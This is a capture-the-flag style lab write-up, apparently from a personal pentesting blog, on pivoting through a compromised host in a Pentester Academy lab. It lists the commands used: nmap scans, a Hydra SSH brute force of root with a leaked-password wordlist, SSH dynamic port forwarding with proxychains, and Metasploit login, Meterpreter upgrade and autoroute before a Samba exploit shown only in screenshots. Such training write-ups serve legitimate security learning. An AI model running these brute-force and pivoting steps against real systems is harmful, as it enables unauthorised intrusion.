---
title: Pivoting VII
date: 2022-06-06 12:00:00 -500
categories: [Pentesting,Pivoting]
tags: [Pentester Academy,Metasploit]
---

# Pivoting VII

# Steps Taken:
#### 1. Scan the target machine with NMAP:

```bash
nmap -sV --script=banner {target-ip}
```

#### 2. Use Hydra to brute force the credentials since SSH is available:
```bash
hydra {target-ip-internal-network} ssh -t 4 -l root -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-40.txt -f -V
```
#### 3. Create a Dynamic Port Forwarding on this SSH session through the first compromised machine:
```bash
ssh -D 9050 root@{target-ip}
```
#### 4. Make sure that the port forwarding is actually enabled by checking it using:
```bash
netstat -tpln
```
on another terminal session and NOT on the same session where the SSH login was done.

#### 5. Do NMAP with Proxychains on this:
```bash
proxychains nmap -sT -Pn {target-ip-internal} -v
		- This shows the open ports are ports 139 and 445 on the target machine inside the internal network
```

![](/assets/img/1624.png)

 #### 6. Reviewing from the previous pivoting labs, we use "exploit/linux/.../is_pipe..." exploit. Let's try that one in this lab as well.

		- We can't execute the metasploit exploit in here since we need autoroute to create a pivot in this compromised machine, but how do you do that with this given SSH session?


		- First, we need to setup the database for Metasploit:
```bash
service postgresql start
msfdb init
msfconsole -q
msf > db_status
```

		- Second, use "auxiliary/scanner/ssh/ssh_login". This is used to create a Metasploit sessions on this SSH session! In this way, we can create a pivot using "autoroute" in Metasploit with this SSH session. In this case, there would be NO NEED FOR THE DYNAMIC PORT FORWARDING since we need to use exploit from Metasploit in the first place.
```bash
msf > use auxiliary/scanner/ssh/ssh_login
msf > set RHOSTS 192.30.160.3
msf > set USERNAME root
msf > set PASSWORD 1234567890
msf > exploit
```

![](/assets/img/1625.png)

**Reference**:
https://nullsweep.com/pivot-cheatsheet-for-pentesters/
	
	- See another session created? Now you can upgrade this to Meterpreter!

		msf > sessions -u 1

#### 7. Now, create the pivot on this compromised machine with SSH session:

![](/assets/img/1626.png)

	- Note that if there would be a way for us to send the exploit through the dynamic port forwarding with just SSH, we wouldn't need to use Metasploit to create a pivot and then send the exploit.

#### 8. In this case, we use the same exploit for Samba as from previous labs since using different exploit seems to be not the point of the box:

![](/assets/img/1627.png)

#### 9. Get the flag:

![](/assets/img/1628.png)

![](/assets/img/1629.png)
